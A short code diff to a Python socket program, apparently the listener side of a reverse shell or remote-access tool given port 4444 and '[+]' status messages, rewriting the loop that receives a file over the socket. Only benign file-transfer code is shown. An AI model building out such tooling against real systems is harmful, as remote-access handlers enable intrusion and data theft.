@@ -7,12 +7,12 @@ PORT = 4444
 
 
 def upload_file(s, file_name):
-    with open(file_name, 'wb') as f:
-        while True:
-            data = s.recv(5000)
-            if not data:
-                break
-            f.write(data)
+    with open(file_name, "wb") as f:
+        raw_data = s.recv(1024)
+        while raw_data:
+            f.write(raw_data)
+            raw_data = s.recv(1024)
+    print("[+] Download Finished!")
 
 
 def download_file(s, file_name):
